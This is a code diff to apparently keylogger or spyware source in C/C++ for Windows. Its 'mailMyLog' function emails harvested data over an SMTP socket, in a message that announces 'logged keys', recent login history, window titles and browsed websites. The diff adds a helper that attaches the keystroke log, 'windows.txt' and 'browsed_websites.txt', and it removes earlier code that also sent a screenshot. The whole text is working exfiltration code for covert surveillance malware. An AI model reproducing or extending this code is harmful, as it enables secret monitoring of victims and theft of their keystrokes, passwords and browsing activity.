@@ -42,6 +42,37 @@ void recvData(SOCKET* socket)
         printf("recv failed: %d\n", WSAGetLastError());
 }
 
+
+void sendTxtAttachment(SOCKET ConnectSocket, char *filename)
+{
+    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
+    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
+    char filenameDisposition[100];
+    sprintf(filenameDisposition, "Content-Disposition: attachment; filename=%s\r\n\r\n", filename);
+    sendData(&ConnectSocket, filenameDisposition);
+    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
+
+    FILE* MailFilePtr = fopen(filename, "r");
+    if (MailFilePtr == NULL)
+        printf("Error opening attachment\n");
+
+    char FileBuffer[1024];
+    char buf[5020];
+
+    memset(FileBuffer, 0, sizeof(FileBuffer));
+    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
+    {
+        sprintf(buf, "%s", FileBuffer);
+        buf[strlen(buf) - 1] = 0;
+        strcat(buf,"\n");
+        sendData(&ConnectSocket, buf);
+        memset(FileBuffer, 0, sizeof(FileBuffer));
+        memset(buf, 0, sizeof(buf));
+    }
+
+    fclose(MailFilePtr);
+}
+
 int mailMyLog(char *receiverAddress) {
 
 
@@ -79,10 +110,7 @@ int mailMyLog(char *receiverAddress) {
             return 1;
         }
 
-        cout<<ConnectSocket<< " "<< ptr->ai_addr << " "<< (int)ptr->ai_addrlen<<endl;
         iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-        cout<< iResult<<endl;
-        cout<< WSAGetLastError()<<endl;
         if (iResult == SOCKET_ERROR) {
             closesocket(ConnectSocket);
             printf("error detected\n");
@@ -122,154 +150,28 @@ int mailMyLog(char *receiverAddress) {
     sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
     sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
     sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
-    FILE *fp = fopen("log.txt", "r");
+
     char mylogs[10000];
     char tem[100];
-    strcat(mylogs, "Hi Admin,=0A=0AHere is the logged key.=0A=0A");
+    strcat(mylogs, "Hi Admin,=0A=0AHere are the logged keys and Prsed Data attached to the mail. And the recent login history are given below as text.=0A=0A");
     sendData(&ConnectSocket, mylogs);
+
+    FILE *fp = fopen("login_history.txt", "r");
     while(fgets(tem,100,fp)!=NULL)
     {
         int size1= strlen(tem);
         tem[size1-1]='\n';
         tem[size1]='\0';
         sendData(&ConnectSocket, tem);
-        //tem[size1-1]='\n';
-
-        //std::cout<< tem <<std::endl;
         strcat(mylogs, tem);
     }
     sendData(&ConnectSocket,"=0A=0ARegards,=0A<SIAM>=0A=0A\r\n\r\n");
-    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
-    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
-    //sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
-    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"windows.txt\"\r\n\r\n");
-    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
 
-    FILE* MailFilePtr = fopen("windows.txt", "r");
-    if (MailFilePtr == NULL)
-        printf("Error opening attachment\n");
+    sendTxtAttachment(ConnectSocket, "windows.txt");
+    sendTxtAttachment(ConnectSocket, "log.txt");
+    sendTxtAttachment(ConnectSocket, "browsed_websites.txt");
 
-    char FileBuffer[1024];
-    char buf[5020];
-
-    memset(FileBuffer, 0, sizeof(FileBuffer));
-    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
-    {
-        sprintf(buf, "%s", FileBuffer);
-        buf[strlen(buf) - 1] = 0;
-        strcat(buf,"\n");
-        //strcat(buf, FileBuffer);
-       // strcat(buf,".\r\n");
-        sendData(&ConnectSocket, buf);
-        //recvData(&ConnectSocket);
-        memset(FileBuffer, 0, sizeof(FileBuffer));
-        memset(buf, 0, sizeof(buf));
-    }
-
-    fclose(MailFilePtr);
-
-    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
-    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
-    //sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
-    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"browsed_websites.txt\"\r\n\r\n");
-    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
-    //sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
-    sendData(&ConnectSocket, ".\r\n");
-
-    MailFilePtr = fopen("browsed_websites.txt", "r");
-    if (MailFilePtr == NULL)
-        printf("Error opening attachment\n");
-
-    //char FileBuffer[1024];
-    //char buf[5020];
-
-    memset(FileBuffer, 0, sizeof(FileBuffer));
-    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
-    {
-        sprintf(buf, "%s", FileBuffer);
-        buf[strlen(buf) - 1] = 0;
-        strcat(buf,"\n");
-        //strcat(buf, FileBuffer);
-       // strcat(buf,".\r\n");
-        sendData(&ConnectSocket, buf);
-        //recvData(&ConnectSocket);
-        memset(FileBuffer, 0, sizeof(FileBuffer));
-        memset(buf, 0, sizeof(buf));
-    }
-
-    fclose(MailFilePtr);
-    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
-    sendData(&ConnectSocket, "Content-Type: image/png\r\n");
-    char tosend[100] = "Content-Length: ";
-
-    FILE *File = fopen("Screenshot_2.png", "r");
-    fseek(File, 0, SEEK_END);
-    unsigned long Size = ftell(File);
-    fseek(File, 0, SEEK_SET);
-
-    char *Buffer = new char[Size];
-
-    fread(Buffer, Size, 1, File);
-    char cSize[MAX_PATH];
-    sprintf(cSize, "%lu", Size);
-    printf("%lu\n", Size);
-    fclose(File);
-    printf("%s\n", Buffer);
-
-
-    sprintf(tosend, "Content-Length: %lu\r\n", Size);
-
-    //sendData(&ConnectSocket, tosend);
-    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=Screenshot_2.png\r\n\r\n");
-    //sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
-    //sendData(&ConnectSocket, ".\r\n");
-
-
-    if (!File)
-    {
-        printf("Error opening the file\n");
-        getchar();
-        return 0;
-    }
-
-
-
-
-    /*int iRes = send(ConnectSocket, cSize, MAX_PATH, 0); // File size
-    if (iRes == SOCKET_ERROR) {
-        printf("send failed (msg: %s): %d\n", cSize, WSAGetLastError());
-    }
-    cout<< 1 <<endl;*/
-    /*int iRes = send(ConnectSocket, Buffer, Size, 0);
-    if (iRes == SOCKET_ERROR) {
-        printf("send failed (msg: %s): %d\n", Buffer, WSAGetLastError());
-    }*/
-    //cout<< 21<<endl;
-    send(ConnectSocket, Buffer, Size, 0);
- /*   int Offset = 0;
-    while(Size > Offset)
-    {
-        int Amount = send(ConnectSocket, Buffer + Offset, Size - Offset, 0);
-
-        if(Amount <= 0)
-        {
-
-            break;
-        }
-        else
-        {
-            Offset += Amount;
-            printf("2\n");
-        }
-    }
-*/
-    delete [] Buffer;
-
-    Sleep(2000);
-    //sendData(&ConnectSocket, "977d81ff9d852ab2a0cad646f8058349--\r\n");
     sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
-    //sendData(&ConnectSocket, buf);
-    //sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
     sendData(&ConnectSocket, ".\r\n");
     recvData(&ConnectSocket);
 
